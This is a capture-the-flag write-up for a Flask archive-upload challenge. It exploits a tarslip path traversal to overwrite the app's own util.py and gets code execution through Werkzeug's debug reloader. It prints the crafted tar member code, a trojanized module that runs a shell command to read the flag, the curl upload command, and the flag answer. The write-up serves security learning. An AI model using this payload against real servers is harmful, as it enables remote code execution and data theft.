# Slippy - CTF Writeup

**Category:** Web Application, Insecure Deserialization / Archive Extraction, RCE

**Author:** Atlas

**Date:** 2026-07-03

**Tools Used:** Python 3 (`tarfile`, `requests`), curl

A Flask "firmware upgrader" app accepts a `tar.gz` upload and extracts it server-side. Objective: read `/app/flag`.

## Source Code Analysis

### Overview

The challenge ships full source. Two routes are exposed by [routes.py](challenge/application/blueprints/routes.py):

| Route | Method | Description |
|---|---|---|
| `/` | GET | Renders the firmware upload page |
| `/api/unslippy` | POST | Accepts a `file` upload, extracts it, returns the list of extracted paths |

The extraction logic lives in [util.py](challenge/application/util.py):

```python
def extract_from_archive(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        extractdir = f'{main.app.config["UPLOAD_FOLDER"]}/{generate(15)}'
        os.makedirs(extractdir, exist_ok=True)

        extracted_filenames = []
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                filename = f'{extractdir}/{name}'
                os.rename(os.path.join(tmp, name), filename)
                extracted_filenames.append(filename)
                continue
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return extracted_filenames
    return False
```

Two things stand out:

1. `tar.extractall(tmp)` extracts every member using its raw `tarinfo.name`, with no check for `../` traversal — a classic "tarslip" bug (this Python `tarfile` behavior predates the PEP 706 extraction filters added in 3.12).
2. The subsequent loop repeats the mistake: `filename = f'{extractdir}/{name}'` followed by `os.rename(...)` — the same attacker-controlled `name` is concatenated again, so a crafted member name escapes the intended `UPLOAD_FOLDER` a second time.

Both operations resolve `../` sequences via normal OS path resolution, so an attacker-chosen relative name determines exactly where content ends up on disk — independent of the random `UPLOAD_FOLDER` subdirectory name, since the traversal math cancels it out.

[run.py](challenge/run.py) runs Flask with `debug=True` (and `use_evalex=False`, which disables the interactive Werkzeug debugger console/PIN — closing off that shortcut to RCE). `debug=True` still enables Werkzeug's **auto-reloader**, which restarts the process whenever a watched source file's mtime changes.

### The Plan

Combine the two bugs into RCE:

1. Upload a `tar.gz` containing a single member named `../../../util.py`.
   - During `tar.extractall(tmp)`, this resolves to `/util.py` (three `..` from `/tmp` bottoms out at `/`).
   - During the loop's `os.rename`, `extractdir/../../../util.py` normalizes to `/app/application/util.py` — the app's own source file — regardless of the random `extractdir` name (three `..` levels exactly cancel `archives/<random>/` → `static` → back to `application`).
2. Set the member's content to a modified `util.py` — keep the original functions intact (so the app doesn't hard-crash) and add a top-level command that reads the flag and drops it somewhere fetchable over HTTP, e.g. Flask's own `/static/` folder.
3. Wait for Werkzeug's reloader to detect the change and restart the process, executing the injected code.
4. Fetch the leaked flag over plain HTTP.

---

## Exploitation

### Overview

Built the malicious archive and sent it directly with Python's `tarfile` + `requests` libraries — no need for a real `tar` binary since the vulnerable extraction logic doesn't validate anything about the archive beyond `tarfile.is_tarfile()`.

### Commands Used

**Input:** Build a `tar.gz` with one regular-file member named `../../../util.py`, containing a trojanized copy of the original module plus a `subprocess` call that dumps `/app/flag` and writes it to the static folder.

```python
info = tarfile.TarInfo(name="../../../util.py")
info.size = len(MALICIOUS_UTIL)
info.mtime = int(time.time()) + 100000  # see below — this line was required
tar.addfile(info, io.BytesIO(MALICIOUS_UTIL))
```

```python
MALICIOUS_UTIL = b'''import functools, tarfile, tempfile, os
from application import main
import subprocess
try:
    out = subprocess.check_output("cat /app/flag 2>&1", shell=True)
except Exception as e:
    out = str(e).encode()
with open('/app/application/static/flag.txt', 'wb') as f:
    f.write(out)

generate = lambda x: os.urandom(x).hex()

def extract_from_archive(file):
    ... # original function body, unchanged, kept so the app stays functional
'''
```

**Input:** POST the archive to `/api/unslippy`.

```bash
curl -s -F "file=@payload.tar.gz;filename=update.tar.gz" http://<target>/api/unslippy
```

**Output:**
```json
{
  "list": [
    "/app/application/static/archives/cf3b8840ee283f6423eb839e375e08/../../../util.py"
  ]
}
```

Confirms the server-side rename executed with our traversal path — no error, meaning the write succeeded.

**First attempt failed** — `GET /static/flag.txt` returned 404 even after waiting several seconds for a restart. Root cause: Python's `tarfile` sets an extracted file's mtime from `TarInfo.mtime`, which defaults to epoch `0` if unset. Werkzeug's stat-based reloader only restarts when a watched file's mtime is **newer** than the value it already cached at startup — an mtime of 1970 never triggers a reload. Fix: explicitly set `TarInfo.mtime` to a timestamp far in the future before adding the member.

**Input:** Re-run with the mtime fix, then fetch the dropped file.

```bash
curl -s http://<target>/static/flag.txt
```

**Output:**
```
HTB{i_slipped_my_way_to_rce}
---
/proc/kpageflags
/app/flag
```

The reloader picked up the new `util.py`, re-executed the module-level `subprocess` call, and the flag landed in the public static folder.

### Solution

**Answer:** `HTB{i_slipped_my_way_to_rce}`

**Summary:** `util.py`'s archive extraction used raw, attacker-controlled tar member names in two separate path-join operations (`extractall` and a manual `os.rename`) without sanitizing `../` sequences — a textbook tarslip. This gave arbitrary file write anywhere the app process could write, including its own source tree. Overwriting `/app/application/util.py` with a version that preserved the original API but added a payload that reads `/app/flag` and drops it into the Flask static folder turned the file-write primitive into RCE, since `debug=True` keeps Werkzeug's auto-reloader watching source files and restarting the process on change. The one non-obvious gotcha: tar-extracted files inherit their mtime from the archive metadata (defaulting to epoch 0), and Werkzeug's reloader only fires on a mtime *increase* — so the payload needed an explicit future `TarInfo.mtime` to actually trigger a restart.

**Scripts:**
- `exploit.py` — builds the malicious `tar.gz` and drives the full upload → wait-for-reload → fetch-flag sequence.

---

## Dead Ends & Lessons Learned

| Approach Tried | Why It Failed | What We Learned |
|---|---|---|
| First exploit run, `TarInfo` with default mtime | `extract_from_archive` succeeded (200, correct path in response) but `/static/flag.txt` never appeared | Tar members default to mtime epoch 0 on extraction; Werkzeug's stat-reloader requires a strictly newer mtime to trigger a restart, so a "silent" file overwrite doesn't always mean the code re-executes |

---

## Flag Summary

| Part | Answer | Explanation |
|------|--------|-------------|
| Flag | `HTB{i_slipped_my_way_to_rce}` | Tarslip path traversal → arbitrary file write → overwrite own source module → Werkzeug debug reloader executes injected code → flag exfiltrated via static file |

---

## References

- [Python tarfile — extraction filters / CVE-2007-4559 background (PEP 706)](https://peps.python.org/pep-0706/)
- [Werkzeug reloader internals](https://werkzeug.palletsprojects.com/en/latest/serving/#reloader)
- OWASP: Path Traversal / Unrestricted File Upload
